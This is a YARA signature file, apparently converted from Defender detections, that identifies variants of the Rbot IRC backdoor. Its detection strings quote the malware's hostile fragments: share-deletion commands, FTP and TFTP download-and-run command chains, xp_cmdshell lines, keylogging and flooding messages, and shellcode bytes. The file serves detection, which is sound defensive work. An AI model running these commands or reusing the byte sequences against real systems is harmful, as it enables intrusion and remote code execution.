rule Backdoor_Win32_Rbot_A_2147792042_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.gen!A"
        threat_id = "2147792042"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "300"
        strings_accuracy = "High"
    strings:
        $x_50_1 = "net share admin$ /delete /y" ascii //weight: 50
        $x_50_2 = "net share ipc$ /delete /y" ascii //weight: 50
        $x_50_3 = "net share d$ /delete /y" ascii //weight: 50
        $x_50_4 = "net share c$ /delete /y" ascii //weight: 50
        $x_10_5 = "nickserv idnetify" ascii //weight: 10
        $x_10_6 = "authserv auth" ascii //weight: 10
        $x_10_7 = "sniff" ascii //weight: 10
        $x_10_8 = "explorer.exe" ascii //weight: 10
        $x_10_9 = "LmHosts" ascii //weight: 10
        $x_10_10 = "JOIN" ascii //weight: 10
        $x_10_11 = "NICK" ascii //weight: 10
        $x_10_12 = "PRIVMSG" ascii //weight: 10
        $x_10_13 = "start /min cmd.exe /c" ascii //weight: 10
        $x_1_14 = "72.20.21.61" ascii //weight: 1
        $x_1_15 = "pass=" ascii //weight: 1
        $x_1_16 = "password=" ascii //weight: 1
        $x_1_17 = "passwd=" ascii //weight: 1
        $x_1_18 = "paypal" ascii //weight: 1
        $x_1_19 = "ProtectedStorage" ascii //weight: 1
        $x_1_20 = "PolicyAgent" ascii //weight: 1
        $x_1_21 = "Messenger" ascii //weight: 1
        $x_1_22 = "CryptSvc" ascii //weight: 1
        $x_1_23 = "Found Windows Product ID" ascii //weight: 1
        $x_1_24 = "yahoo.co.jp" ascii //weight: 1
        $x_1_25 = "www.nifty.com" ascii //weight: 1
        $x_1_26 = "www.above.net" ascii //weight: 1
        $x_1_27 = "www.level3.com" ascii //weight: 1
        $x_1_28 = "www.stanford.edu" ascii //weight: 1
        $x_1_29 = "IcmpCreateFile" ascii //weight: 1
        $x_1_30 = "SeDebugPrivilege" ascii //weight: 1
        $x_1_31 = "RegisterServiceProcess" ascii //weight: 1
        $x_1_32 = "CreateToolhelp32Snapshot" ascii //weight: 1
        $x_1_33 = "Yahoo! User ID" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_50_*) and 8 of ($x_10_*) and 20 of ($x_1_*))) or
            ((4 of ($x_50_*) and 9 of ($x_10_*) and 10 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Win32_Rbot_2147792324_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot"
        threat_id = "2147792324"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "Low"
    strings:
        $n_100_1 = "McAfee Stinger" wide //weight: -100
        $n_100_2 = "McAfee Inc. Stinger" wide //weight: -100
        $x_1_3 = "NTPass" ascii //weight: 1
        $x_1_4 = "ntscan139" ascii //weight: 1
        $x_1_5 = "ntscan445" ascii //weight: 1
        $x_1_6 = "lsass_445" ascii //weight: 1
        $x_1_7 = "lsass_135" ascii //weight: 1
        $x_1_8 = "lsass_139" ascii //weight: 1
        $x_1_9 = "dcom135" ascii //weight: 1
        $x_1_10 = "dcom1025" ascii //weight: 1
        $x_1_11 = "dcom2" ascii //weight: 1
        $x_1_12 = "IIS5SSL" ascii //weight: 1
        $x_1_13 = "Beagle1" ascii //weight: 1
        $x_1_14 = "Beagle2" ascii //weight: 1
        $x_1_15 = "MyDoom" ascii //weight: 1
        $x_1_16 = "Optix" ascii //weight: 1
        $x_1_17 = "NetDevil" ascii //weight: 1
        $x_1_18 = "DameWare" ascii //weight: 1
        $x_1_19 = "Kuang2" ascii //weight: 1
        $x_1_20 = "cmd[003]%s|%i|" ascii //weight: 1
        $x_1_21 = "pleaz_run%s" ascii //weight: 1
        $x_1_22 = "pleaz_run_done" ascii //weight: 1
        $x_1_23 = "pass_pleaz" ascii //weight: 1
        $x_1_24 = "pass_pleaz%s" ascii //weight: 1
        $x_1_25 = "tftp -i %s get %s" ascii //weight: 1
        $x_1_26 = "[%s]: Exploiting IP: %s." ascii //weight: 1
        $x_2_27 = "[%s]: Exploiting IP: %s, Password: (%s)" ascii //weight: 2
        $x_2_28 = "[%s]: Exploiting IP: (%s:%d) User: (%s/%s)." ascii //weight: 2
        $x_2_29 = "[%s]: Exploiting IP: %s, Share: \\%s, User: (%s/%s)" ascii //weight: 2
        $x_1_30 = "\\%s\\pipe\\epmapper" ascii //weight: 1
        $x_1_31 = "WinXP Professional    [universal] lsass.exe" ascii //weight: 1
        $x_1_32 = "Win2k Professional    [universal] netrap.dll" ascii //weight: 1
        $x_1_33 = "Win2k Advanced Server [SP4]       netrap.dll" ascii //weight: 1
        $x_2_34 = "echo open %s %d > o&echo user 1 1 >> o &echo get" ascii //weight: 2
        $x_1_35 = "EXEC master..xp_cmdshell 'tftp -i %s GET %s'" ascii //weight: 1
        $x_1_36 = "EXEC master..xp_cmdshell '%s'" ascii //weight: 1
        $x_1_37 = "\\\\%s\\ipc$" ascii //weight: 1
        $x_1_38 = "Admin$\\system32" ascii //weight: 1
        $x_1_39 = "c$\\winnt\\system32" ascii //weight: 1
        $x_1_40 = "c$\\windows\\system32" ascii //weight: 1
        $x_1_41 = "%s CD Key: (%s)." ascii //weight: 1
        $x_2_42 = "Server: myBot" ascii //weight: 2
        $x_2_43 = "*@*.fbi.gov" ascii //weight: 2
        $x_2_44 = "*@.fbi.gov" ascii //weight: 2
        $x_1_45 = "$rndnick" ascii //weight: 1
        $x_1_46 = "%sdel.bat" ascii //weight: 1
        $x_1_47 = "%%comspec%% /c %s %s" ascii //weight: 1
        $x_1_48 = "paypal.com" ascii //weight: 1
        $x_1_49 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run" ascii //weight: 1
        $x_1_50 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices" ascii //weight: 1
        $x_1_51 = "Software\\Microsoft\\OLE" ascii //weight: 1
        $x_1_52 = "SYSTEM\\CurrentControlSet\\Control\\Lsa" ascii //weight: 1
        $x_1_53 = "ddos.syn" ascii //weight: 1
        $x_1_54 = "ddos.ack" ascii //weight: 1
        $x_1_55 = "ddos.random" ascii //weight: 1
        $x_1_56 = "ddos.stop" ascii //weight: 1
        $x_1_57 = "clonestop" ascii //weight: 1
        $x_1_58 = "icmpflood" ascii //weight: 1
        $x_1_59 = "httpstop" ascii //weight: 1
        $x_1_60 = "DDoS flood" ascii //weight: 1
        $x_1_61 = "synstop" ascii //weight: 1
        $x_1_62 = "Syn flood" ascii //weight: 1
        $x_1_63 = "udpstop" ascii //weight: 1
        $x_1_64 = "UDP flood" ascii //weight: 1
        $x_1_65 = "pingstop" ascii //weight: 1
        $x_1_66 = "Ping flood" ascii //weight: 1
        $x_1_67 = "tftpstop" ascii //weight: 1
        $x_1_68 = "scanstop" ascii //weight: 1
        $x_1_69 = "scanstats" ascii //weight: 1
        $x_1_70 = "netinfo" ascii //weight: 1
        $x_1_71 = "sysinfo" ascii //weight: 1
        $x_1_72 = "getcdkeys" ascii //weight: 1
        $x_1_73 = "getclip" ascii //weight: 1
        $x_1_74 = "opencmd" ascii //weight: 1
        $x_1_75 = "cmdstop" ascii //weight: 1
        $x_1_76 = "Exploit Statistics:" ascii //weight: 1
        $x_1_77 = "Scan not active." ascii //weight: 1
        $x_2_78 = "Server started on Port: %d, File: %s, Request: %s." ascii //weight: 2
        $x_1_79 = "Server listening on IP: %s:%d, Directory: %s\\." ascii //weight: 1
        $x_2_80 = "Done with flood (%iKB/sec)." ascii //weight: 2
        $x_2_81 = "Downloaded %.1fKB to %s @ %.1fKB/sec. Updating." ascii //weight: 2
        $x_1_82 = "Bot started." ascii //weight: 1
        $x_1_83 = "Status: Ready. Bot Uptime: %s." ascii //weight: 1
        $x_1_84 = "Bot ID: %s." ascii //weight: 1
        $x_1_85 = "[MAIN]: Network Info." ascii //weight: 1
        $x_1_86 = "[MAIN]: System Info." ascii //weight: 1
        $x_1_87 = "Removing Bot." ascii //weight: 1
        $x_1_88 = "[MAIN]: Get Clipboard." ascii //weight: 1
        $x_1_89 = "[KEYLOG]: %s" ascii //weight: 1
        $x_1_90 = "[FINDFILE]: Searching for file: %s." ascii //weight: 1
        $x_3_91 = "The Windows logon (Pid: <%d>) information is: Domain: \\%S, User: (%S/" ascii //weight: 3
        $x_1_92 = "[ICMP]: Done with %s flood to IP: %s. Sent: %d packet(s) @ %dKB/sec (%dMB)." ascii //weight: 1
        $x_1_93 = "[NET]: %s <Server: %S> <Message: %S>" ascii //weight: 1
        $x_1_94 = "[PING]: Error sending pings to %s." ascii //weight: 1
        $x_1_95 = "[PING]: Finished sending pings to %s." ascii //weight: 1
        $x_1_96 = "[PSNIFF]: Suspicious %s packet from: %s:%d - %s." ascii //weight: 1
        $x_1_97 = "[SECURE]: Failed to start secure thread, error: <%d>." ascii //weight: 1
        $x_1_98 = "[SOCKS4]: Server started on: %s:%d." ascii //weight: 1
        $x_1_99 = "[EMAIL]: Message sent to %s." ascii //weight: 1
        $x_1_100 = "[SECURE]: DCOM enabled." ascii //weight: 1
        $x_1_101 = "[REDIRECT]: Client connection from IP: %s:%d, Server thread: %d." ascii //weight: 1
        $x_1_102 = "[VISIT]: URL visited." ascii //weight: 1
        $x_1_103 = "[SYN]: Done with flood (%iKB/sec)." ascii //weight: 1
        $x_1_104 = "[SYSINFO]: [CPU]: %I64uMHz. [RAM]: %sKB total, %sKB free. [Disk]: %s total, %s free. [OS]: Windows %s (%d.%d, Build %d). [Sysdir]: %s. [Hostname]: %s (%s). [Current User]: %s. [Date]: %s. [Time]: %s. [Uptime]: %s." ascii //weight: 1
        $x_1_105 = "[NETINFO]: [Type]: %s (%s). [IP Address]: %s. [Hostname]: %s." ascii //weight: 1
        $x_1_106 = "[THREADS]: List threads." ascii //weight: 1
        $x_1_107 = "[LOG]: Listing log." ascii //weight: 1
        $x_1_108 = "[LOG]: Failed to start listing thread, error: <%d>." ascii //weight: 1
        $x_1_109 = "[PROC]: Listing processes:" ascii //weight: 1
        $x_1_110 = "[PROCS]: Proccess list." ascii //weight: 1
        $x_1_111 = "[CDKEYS]: Search completed." ascii //weight: 1
        $x_1_112 = "[CMD]: Remote shell already running." ascii //weight: 1
        $x_1_113 = "[CMD]: Remote shell ready." ascii //weight: 1
        $x_1_114 = "[UPDATE]: Bot ID must be different than current running process." ascii //weight: 1
        $x_1_115 = "[FINDFILE]: Searching for file: %s in: %s." ascii //weight: 1
        $x_1_116 = "Flooding: (%s) for %s seconds." ascii //weight: 1
        $x_1_117 = "Failed to start flood thread, error: <%d>." ascii //weight: 1
        $x_1_118 = "Invalid flood time must be greater than 0." ascii //weight: 1
        $x_1_119 = "\\\\\\C$\\123456111111111111" wide //weight: 1
        $x_2_120 = {eb 19 5e 31 c9 81 e9 89 ff ff ff 81 36 80 bf 32 94 81 ee fc ff ff ff e2 f2 eb 05 e8 e2 ff ff ff 03 53 06 1f 74 57 75 95 80 bf bb 92 7f 89 5a 1a}  //weight: 2, accuracy: High
        $x_2_121 = {eb 10 5a 4a 33 c9 66 b9 76 01 80 34 0a 99 e2 fa eb 05 e8 eb ff ff ff 70 61 99 99 99 c3 21 95 69}  //weight: 2, accuracy: High
        $x_1_122 = {46 00 58 00 4e 00 42 00 46 00 58 00 46 00 58 00 4e 00 42 00 46 00 58 00 46 00 58 00 46 00 58 00 46 00 58 00 ff ff ff ff}  //weight: 1, accuracy: High
        $x_2_123 = {80 34 0a 99 e2 fa eb 05 e8}  //weight: 2, accuracy: High
        $x_2_124 = {31 00 32 00 37 00 2e 00 30 00 2e 00 30 00 2e 00 31 00 5c 00 49 00 50 00 43 00 24 00 5c 00 45 45}  //weight: 2, accuracy: High
        $x_1_125 = {5c 00 43 00 24 00 5c 00 31 00 32 00 33 00 34 00 35 00 36 00 31 00 31 00 31 00 31 00 31 00 31 00 31 00 31 00 31 00 31 00 31 00 31 00 31 00 31 00 31 00 2e 00 64 00 6f 00 63}  //weight: 1, accuracy: High
        $x_1_126 = "%i.%i.%i.%i" ascii //weight: 1
        $x_3_127 = {70 95 98 99 99 c3 fd 38 a9 99 99 99 12 d9 95 12 e9 85 34}  //weight: 3, accuracy: High
        $x_3_128 = {71 93 99 c9 99 c9 99 c9 12 fd bd 91 fd 16 99 c9 c1 72 68}  //weight: 3, accuracy: High
        $x_1_129 = {35 2e 30 00 35 2e 31}  //weight: 1, accuracy: High
        $x_1_130 = "PC NETWORK PROGRAM 1.0" ascii //weight: 1
        $x_1_131 = {6a 1a 99 59 f7 f9 56 80 c2 61 88 97}  //weight: 1, accuracy: High
        $x_1_132 = {75 1f 6a 01 5f 68 98 3a 00 00}  //weight: 1, accuracy: High
        $x_2_133 = {74 03 ff 4d fc 68 b8 0b 00 00 ff 15}  //weight: 2, accuracy: High
        $x_3_134 = {8d 45 f0 50 8d 45 ac 50 8d 85 a4 fd ff ff 50 57 6a 28 6a 01 57 8d 85 a8}  //weight: 3, accuracy: High
        $x_1_135 = {ff d6 33 d2 b9 e8 03 00 00 f7 f1 a3}  //weight: 1, accuracy: High
        $x_1_136 = "[%.2d-%.2d-%4d %.2d:%.2d:%.2d] %s" ascii //weight: 1
        $x_1_137 = "Ftpd 0wns j0" ascii //weight: 1
        $x_2_138 = "221 Goodbye happy r00ting." ascii //weight: 2
        $x_3_139 = "echo open %s %d > o&echo user" ascii //weight: 3
        $x_1_140 = "(keylog.p" ascii //weight: 1
        $x_1_141 = "[RGHT]" ascii //weight: 1
        $x_1_142 = "[NMLK]" ascii //weight: 1
        $x_1_143 = "!login" ascii //weight: 1
        $x_1_144 = "now an IRC Operator" ascii //weight: 1
        $x_1_145 = "transfer complete to IP: %s" ascii //weight: 1
        $x_1_146 = "attempting to root %s" ascii //weight: 1
        $x_2_147 = "now executing %s on remote machine" ascii //weight: 2
        $x_1_148 = "%*s %[^,],%[^,],%[^,],%[^,],%[^,],%[" ascii //weight: 1
        $x_2_149 = "PRIVMSG %s :Found %s Files and %s Directories" ascii //weight: 2
        $x_1_150 = "PRIVMSG %s :%-31s  %-21s" ascii //weight: 1
        $x_1_151 = "%s %s HTTP/1.1" ascii //weight: 1
        $x_1_152 = "portscan.p" ascii //weight: 1
        $x_2_153 = "if exist \"%%1\" goto repeat" ascii //weight: 2
        $x_1_154 = "Error sending packets to IP: %s. Packets sent: %d. Returned: <%d>" ascii //weight: 1
        $x_1_155 = "[%d-%d-%d %d:%d:%d] %s" ascii //weight: 1
        $x_1_156 = "%s (Changed Windows: %s)" ascii //weight: 1
        $x_1_157 = "daemon.rlogin.on" ascii //weight: 1
        $x_1_158 = "root.currentip" ascii //weight: 1
        $x_1_159 = "util.flushdns" ascii //weight: 1
        $x_1_160 = "util.flusharp" ascii //weight: 1
        $x_1_161 = "-[Login List]-" ascii //weight: 1
        $x_1_162 = "com.ocmd.off" ascii //weight: 1
        $x_1_163 = "com.opencmd" ascii //weight: 1
        $x_1_164 = "com.driveinfo" ascii //weight: 1
        $x_1_165 = "com.uptime" ascii //weight: 1
        $x_1_166 = "com.harvest" ascii //weight: 1
        $x_1_167 = "com.procs" ascii //weight: 1
        $x_1_168 = "irc.rm0" ascii //weight: 1
        $x_1_169 = "irc.rem0ve" ascii //weight: 1
        $x_1_170 = "proxy.socks4.off" ascii //weight: 1
        $x_1_171 = "proxy.socks4.on" ascii //weight: 1
        $x_2_172 = {64 6d 69 6e 00 [0-4] 61 64 6d 69 6e 69 73}  //weight: 2, accuracy: Low
        $x_1_173 = "mIRC v6.16" ascii //weight: 1
        $x_2_174 = "User: %s logged in." ascii //weight: 2
        $x_2_175 = "start AV/FW killer thread" ascii //weight: 2
        $x_2_176 = "Servstrict access to the IPC$" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (not (any of ($n*))) and
        (
            ((20 of ($x_1_*))) or
            ((1 of ($x_2_*) and 18 of ($x_1_*))) or
            ((2 of ($x_2_*) and 16 of ($x_1_*))) or
            ((3 of ($x_2_*) and 14 of ($x_1_*))) or
            ((4 of ($x_2_*) and 12 of ($x_1_*))) or
            ((5 of ($x_2_*) and 10 of ($x_1_*))) or
            ((6 of ($x_2_*) and 8 of ($x_1_*))) or
            ((7 of ($x_2_*) and 6 of ($x_1_*))) or
            ((8 of ($x_2_*) and 4 of ($x_1_*))) or
            ((9 of ($x_2_*) and 2 of ($x_1_*))) or
            ((10 of ($x_2_*))) or
            ((1 of ($x_3_*) and 17 of ($x_1_*))) or
            ((1 of ($x_3_*) and 1 of ($x_2_*) and 15 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_2_*) and 13 of ($x_1_*))) or
            ((1 of ($x_3_*) and 3 of ($x_2_*) and 11 of ($x_1_*))) or
            ((1 of ($x_3_*) and 4 of ($x_2_*) and 9 of ($x_1_*))) or
            ((1 of ($x_3_*) and 5 of ($x_2_*) and 7 of ($x_1_*))) or
            ((1 of ($x_3_*) and 6 of ($x_2_*) and 5 of ($x_1_*))) or
            ((1 of ($x_3_*) and 7 of ($x_2_*) and 3 of ($x_1_*))) or
            ((1 of ($x_3_*) and 8 of ($x_2_*) and 1 of ($x_1_*))) or
            ((1 of ($x_3_*) and 9 of ($x_2_*))) or
            ((2 of ($x_3_*) and 14 of ($x_1_*))) or
            ((2 of ($x_3_*) and 1 of ($x_2_*) and 12 of ($x_1_*))) or
            ((2 of ($x_3_*) and 2 of ($x_2_*) and 10 of ($x_1_*))) or
            ((2 of ($x_3_*) and 3 of ($x_2_*) and 8 of ($x_1_*))) or
            ((2 of ($x_3_*) and 4 of ($x_2_*) and 6 of ($x_1_*))) or
            ((2 of ($x_3_*) and 5 of ($x_2_*) and 4 of ($x_1_*))) or
            ((2 of ($x_3_*) and 6 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_3_*) and 7 of ($x_2_*))) or
            ((3 of ($x_3_*) and 11 of ($x_1_*))) or
            ((3 of ($x_3_*) and 1 of ($x_2_*) and 9 of ($x_1_*))) or
            ((3 of ($x_3_*) and 2 of ($x_2_*) and 7 of ($x_1_*))) or
            ((3 of ($x_3_*) and 3 of ($x_2_*) and 5 of ($x_1_*))) or
            ((3 of ($x_3_*) and 4 of ($x_2_*) and 3 of ($x_1_*))) or
            ((3 of ($x_3_*) and 5 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_3_*) and 6 of ($x_2_*))) or
            ((4 of ($x_3_*) and 8 of ($x_1_*))) or
            ((4 of ($x_3_*) and 1 of ($x_2_*) and 6 of ($x_1_*))) or
            ((4 of ($x_3_*) and 2 of ($x_2_*) and 4 of ($x_1_*))) or
            ((4 of ($x_3_*) and 3 of ($x_2_*) and 2 of ($x_1_*))) or
            ((4 of ($x_3_*) and 4 of ($x_2_*))) or
            ((5 of ($x_3_*) and 5 of ($x_1_*))) or
            ((5 of ($x_3_*) and 1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((5 of ($x_3_*) and 2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((5 of ($x_3_*) and 3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Win32_Rbot_B_2147792349_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.gen!B"
        threat_id = "2147792349"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "PC NETWORK PROGRAM 1.0" ascii //weight: 5
        $x_3_2 = "fukoff" ascii //weight: 3
        $x_3_3 = "reboot" ascii //weight: 3
        $x_3_4 = "nick" ascii //weight: 3
        $x_3_5 = "join" ascii //weight: 3
        $x_1_6 = "$/ ipcv" ascii //weight: 1
        $x_1_7 = "Admin$\\sys" ascii //weight: 1
        $x_1_8 = "c$\\winnt" ascii //weight: 1
        $x_1_9 = "(no password)" ascii //weight: 1
        $x_1_10 = "Exploiting IP: " ascii //weight: 1
        $x_1_11 = "User: (%s) P\\" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_3_*) and 6 of ($x_1_*))) or
            ((1 of ($x_5_*) and 4 of ($x_3_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Win32_Rbot_C_2147792350_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.gen!C"
        threat_id = "2147792350"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "17"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "cmd.exe /C echo open %s %hu>x&echo user asn x>>x&echo bin>>x&echo get %s>>x&echo bye>>x&del x&ftp.exe -n -s:x&rundll32.exe %s,start" ascii //weight: 3
        $x_3_2 = "PC NETWORK PROGRAM 1.0" ascii //weight: 3
        $x_3_3 = "LANMAN1.0" ascii //weight: 3
        $x_3_4 = "local ip: %s, global ip: %s" ascii //weight: 3
        $x_1_5 = "PASS" ascii //weight: 1
        $x_1_6 = "PORT" ascii //weight: 1
        $x_1_7 = "(DEBUG) Download caused crash!" ascii //weight: 1
        $x_1_8 = "icmpflood" ascii //weight: 1
        $x_1_9 = "udpflood" ascii //weight: 1
        $x_1_10 = "synflood" ascii //weight: 1
        $x_1_11 = "spazflood" ascii //weight: 1
        $x_1_12 = "rundll32.exe %s,start" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_3_*) and 8 of ($x_1_*))) or
            ((4 of ($x_3_*) and 5 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Win32_Rbot_G_2147792383_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.gen!G"
        threat_id = "2147792383"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b7 c0 99 b9 01 04 00 00 f7 f9 52 ff 15 ?? ?? ?? ?? [0-7] 68 78 56 34 12 60 00 [0-48] c6 45 ?? 45}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Win32_Rbot_H_2147792384_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.gen!H"
        threat_id = "2147792384"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 06 03 d8 50 8d 46 da 50 8d 85 ?? ?? ff ff 68 ?? ?? ?? 00 50 e8 ?? ?? ?? 00 8d 85 ?? ?? ff ff 57 50 8d 85 ?? ?? ff ff 50 e8 ?? ?? ?? ?? 83 c6 3c 83 c4 1c 83 7e f8 00 75 c6 5e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Win32_Rbot_I_2147792386_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.gen!I"
        threat_id = "2147792386"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {89 8d f8 fb ff ff 8b 85 fc fd ff ff 6b c0 3c ff b0 ?? ?? ?? 00 8b 85 fc fd ff ff 6b c0 3c 05 ?? ?? ?? 00 50 68 ?? ?? ?? 00 8d 85 00 fe ff ff 50 e8}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Win32_Rbot_ST_2147792399_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.ST"
        threat_id = "2147792399"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\hkicmd.exe" wide //weight: 1
        $x_1_2 = "C:\\Builds\\TP\\indysockets\\lib\\Protocols\\IdHTTP.pas" wide //weight: 1
        $x_1_3 = {8b f3 81 e6 f0 00 00 00 83 fe 40 77 ?? 6a 00 68 80 00 00 00 6a 02 6a 00 c1 ee 04 8b 04 b5 ?? ?? ?? 00 50 68 00 00 00 c0 8b c7}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Win32_Rbot_D_2147792400_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.gen!D"
        threat_id = "2147792400"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {6a 2f 59 8d 75 08 8b fc f3 a5 e8 ?? ?? ?? ?? 81 c4 c0 00 00 00 68 f4 01 00 00 ff 15 ?? ?? ?? ?? eb}  //weight: 1, accuracy: Low
        $x_1_2 = {b9 2f 00 00 00 8d 75 08 8b fc f3 a5 e8 ?? ?? ?? ?? 81 c4 c0 00 00 00 68 f4 01 00 00 ff 15 ?? ?? ?? ?? eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Backdoor_Win32_Rbot_PN_2147792407_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.PN"
        threat_id = "2147792407"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {eb 0f 8b 85 ?? fe ff ff 83 c0 01 89 85 ?? fe ff ff 81 bd ?? fe ff ff ?? ?? ?? ?? 7d 20 6a 00 6a 00 6a 00 6a 00 6a 00}  //weight: 1, accuracy: Low
        $x_1_2 = {58 73 6a 75 66 51 73 70 64 66 74 74 4e 66 6e 70 73 7a 00 00 48 66 75 55 69 73 66 62 65 44 70 6f 75 66 79 75}  //weight: 1, accuracy: High
        $x_1_3 = "Zebra0" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Win32_Rbot_F_2147792410_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.gen!F"
        threat_id = "2147792410"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        info = "gen: malware that is detected using a generic signature"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 30 75 00 00 68 ?? ?? ?? ?? ?? ?? ff 15 ?? ?? ?? ?? 50 ff 15 ?? ?? ?? ?? 3d 02 01 00 00 75}  //weight: 1, accuracy: Low
        $x_1_2 = {eb 35 81 bd a8 00 00 00 8b 00 00 00 75 0e ff 75 fc ff 75 f8 (53|56) e8 ?? ?? ?? ?? eb 18 81 bd a8 00 00 00 bd 01 00 00 75 12}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Win32_Rbot_QM_2147792414_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.QM"
        threat_id = "2147792414"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "[ZYEXEC]" ascii //weight: 1
        $x_1_2 = "[ZYLOAD]" ascii //weight: 1
        $x_1_3 = "[ZYSHELL]" ascii //weight: 1
        $x_1_4 = {7a 79 73 69 6e 66 6f 00}  //weight: 1, accuracy: High
        $x_1_5 = {7a 79 72 65 61 64 73 00}  //weight: 1, accuracy: High
        $x_1_6 = {7a 79 62 6f 74 2e 6f 66 66 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Win32_Rbot_SV_2147792445_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Rbot.SV"
        threat_id = "2147792445"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Rbot"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {28 28 02 62 79 20 42 4f 54 43 4f 4d 29 29}  //weight: 1, accuracy: High
        $x_1_2 = "winlolx.exe" ascii //weight: 1
        $x_1_3 = "Windows LoL Layer" ascii //weight: 1
        $x_1_4 = "BoT|" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

